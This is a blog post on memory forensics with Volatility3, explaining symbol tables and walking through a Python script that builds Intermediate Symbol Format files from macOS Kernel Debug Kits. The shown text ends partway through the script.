<h3 class="anchor anchorWithStickyNavbar_LWe7" id="volatility-main-components">Volatility main components<a href="https://forensicxlab.github.io/blog/macisf#volatility-main-components" class="hash-link" aria-label="Direct link to Volatility main components" title="Direct link to Volatility main components">‚Äã</a></h3>
<p>When doing memory analysis with Volatility3, the memory is split into three major components :</p>
<ul>
<li><strong>Memory Layers</strong> : This component allows correct memory mapping and address translation.</li>
<li><strong>Templates and Objects</strong> :  A template is the representation of what we know about the structure of the final object we want to extract and explore from the memory layer to perform memory forensic.</li>
<li><strong>Symbol Tables</strong> :<!-- -->
<ul>
<li>When a program is compiled, it is aware of its own structures and how they are stored. This means that when doing offline memory analysis, volatility needs to be aware of the context of the program that were executed.</li>
<li>When the compilation of a program is performed, debugging symbols are produce alongside it. A symbol can be viewed as an address associated to a template.</li>
<li>We can picture the set of debugging symbols produced at compilation being equal to one SymbolTable which is a JSON structure understandable by volatility.  The more SymbolTable volatility possesses the more symbols and templates it can extract from memory.</li>
<li>The representation of all of the SymbolTables retrieved by volatility is called the SymbolSpace. The SymbolSpace is stored within the context of the volatility3 framework. When executing volatility3 on a memory dump, it is going to build its context and SymbolSpace from the user's provided SymbolTables.</li>
</ul>
</li>
</ul>
<p>As a memory forensics investigator, our goal will be first to extract the debugging symbols generated by the kernel when compiled which will allow us to identify how the system's essential structures are stored in memory. The majority of basic Volatility3 plugging are using the kernel symbols.</p>
<p>For <strong>Windows</strong> memory analysis, Volatility is going to build the context using Windows Program Database (PDB) files which are directly fetched from microsoft website and translated into SymbolTables if not already present locally.</p>
<p>For <strong>Linux</strong>, the task is more complicated. Indeed Linux can be declined into a lot of distributions which are all having a different kernel versions which means different SymbolSpace for each version. If you want to perform memory forensic on a random linux you need to extract the kenel debugging symbols of the target which are not always easy to find according to the distribution.</p>
<p>For <strong>Mac</strong> the task is similar to Linux, however there is only one single distribution. Mac is tracking the system versions and build numbers. For each system version and build number there is different kernel version therefore potentially different kernel debugging symbols.</p>
<p>The first step to even be able to analyse a memory dump is being able to build the right context. Any incident response team or an investigator would gain a fair amount of time not bothering generating SymbolTables. In the next section we will go deeper on how to generate Intermediate Symbol Format (ISF) file for mac and my journey into the automation of the process for a far amount of mac system versions.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="macos-kernel-debug-kit">MacOs Kernel Debug Kit<a href="https://forensicxlab.github.io/blog/macisf#macos-kernel-debug-kit" class="hash-link" aria-label="Direct link to MacOs Kernel Debug Kit" title="Direct link to MacOs Kernel Debug Kit">‚Äã</a></h2>
<p>If you have an Apple account, you can find what Apple calls "Kernel Debug Kits" (KDK). For one specific mac os version and build number, the package contains development &amp; debug versions of the macOS kernel. These files contain full symbolic information, unlike the equivalent files in a normal macOS installation. This is exactly what we need to create our SymbolTables. Mac as well as Linux are using DWARF file to represent the kernel with debugging symbols. The VolatilityFoundation created a go program call dwarf2json to parse the appropriate DWARF files into a JSON ISF file to build the SymbolTables. The Kernel Debugging Kits are available here.</p>
<p>Therefore here are the goals :</p>
<ul>
<li>Download all KDK available from Apple's website.</li>
<li>Identify the kernel symbols for each version.</li>
<li>Generate the ISF files.</li>
<li>Share and maintain.</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="automation">Automation<a href="https://forensicxlab.github.io/blog/macisf#automation" class="hash-link" aria-label="Direct link to Automation" title="Direct link to Automation">‚Äã</a></h2>
<p>The first step was to download all the KDK which are dmg images from Apple's developper website. We can identify that there is 241 available KDK that are covering mac os version 10.4.11_build_8s216 to 12.3_Build_StarESeed21E5212f.</p>
<p>I have decided to pick one KDK per major system version to identify the differences in the file structures and where the kernel debugging symbols are located. From there we can begin the script.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/screenshot-75c4f63527ba5ef1f03f9f97d7ce64cc.png" title="Downloaded ISF" width="2136" height="1626" class="img_ev3q"></p>
<p>The major steps are for each KDK :</p>
<ul>
<li>Extract the pkg file from the dmg image.</li>
<li>Unpack the pkg file.</li>
<li>Find the kernel debugging symbols DWARF files.</li>
<li>Create the IFS JSON file</li>
</ul>
<p>I chose to use python3 for the implementation :</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> subprocess</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> argparse</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> logging</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">path</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> re</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">find_and_generate_kernel_symbols</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">dir_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> kernel_version</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">"""Generate the ISF file for the kernel DWARF files found"""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    cmd </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">'./dwarf2json'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'mac'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> dirpath</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> dirnames</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> files </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">walk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">dir_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> filename </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> files</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"kernel"</span><span class="token plain"> </span><span class="token operator">==</span><span class="token plain"> filename </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">or</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"mach_kernel"</span><span class="token plain"> </span><span class="token operator">==</span><span class="token plain"> filename</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                todo </span><span class="token operator">=</span><span class="token plain"> os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">join</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">dirpath</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> filename</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                cmd</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">append</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'--macho-symbols'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                cmd</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">append</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">todo</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"Generating volatility ISF for </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">kernel_version</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)"> "</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">with</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">open</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"ISF/"</span><span class="token operator">+</span><span class="token plain">kernel_version</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token operator">+</span><span class="token string" style="color:rgb(255, 121, 198)">".json"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"a"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">as</span><span class="token plain"> outfile</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">try</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            subprocess</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">run</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">cmd</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> stdout</span><span class="token operator">=</span><span class="token plain">outfile</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">except</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">error</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f'Could not generate ISF for </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">todo</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">try</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        subprocess</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">check_output</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">'tar'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'-cJf'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"ISF/"</span><span class="token operator">+</span><span class="token plain">kernel_version</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token operator">+</span><span class="token string" style="color:rgb(255, 121, 198)">".json.xz"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"ISF/"</span><span class="token operator">+</span><span class="token plain">kernel_version</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token operator">+</span><span class="token string" style="color:rgb(255, 121, 198)">".json"</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">except</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">error</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f'Could not compress ISF into an xz archive'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">dir_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">string</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">"""Check if the directory passed is indeed a directory"""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">isdir</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">string</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> string</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">else</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">raise</span><span class="token plain"> NotADirectoryError</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">string</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> __name__ </span><span class="token operator">==</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'__main__'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    parser </span><span class="token operator">=</span><span class="token plain"> argparse</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">ArgumentParser</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">description </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"Generate all volatility symbole files for the different macOs versions"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    parser</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">add_argument</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'--path'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">type</span><span class="token operator">=</span><span class="token plain">dir_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">"""init"""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    args </span><span class="token operator">=</span><span class="token plain"> parser</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">parse_args</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    logging</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">basicConfig</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">level</span><span class="token operator">=</span><span class="token plain">logging</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">INFO</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    logger </span><span class="token operator">=</span><span class="token plain"> logging</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">getLogger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">__name__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'Started'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    src_dir </span><span class="token operator">=</span><span class="token plain"> args</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">path</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    reg_exp </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">r'[k|K]ern[e|a]l_[d|D]ebug_[K|k]it_(.*)\.dmg'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">"""routine"""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> dmg_image </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">listdir</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">src_dir</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"DS_Store"</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> dmg_image</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        kernel_version </span><span class="token operator">=</span><span class="token plain"> re</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">findall</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">reg_exp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> dmg_image</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f'Kernel version : </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">kernel_version</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)"> '</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f'Extracting </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">dmg_image</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">try</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            subprocess</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">check_output</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">'7z'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'x'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> src_dir</span><span class="token operator">+</span><span class="token string" style="color:rgb(255, 121, 198)">"/"</span><span class="token operator">+</span><span class="token plain">dmg_image</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">except</span><span class="token plain"> subprocess</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">CalledProcessError </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">as</span><span class="token plain"> err</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">error</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f'Could not extract pkg from : </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">dmg_image</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)"> : </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">err</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">try</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            kernel_debug_kit_path </span><span class="token operator">=</span><span class="token plain"> dir_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"KernelDebugKit"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            find_and_generate_kernel_symbols</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">kernel_debug_kit_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> kernel_version</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">except</span><span class="token plain"> NotADirectoryError</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">pass</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">try</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                kernel_debug_kit_path </span><span class="token operator">=</span><span class="token plain"> dir_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"Kernel Debug Kit"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f'Extracting pkg...'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">try</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    subprocess</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">check_output</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">'pkgutil'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'--expand-full'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> kernel_debug_kit_path</span><span class="token operator">+</span><span 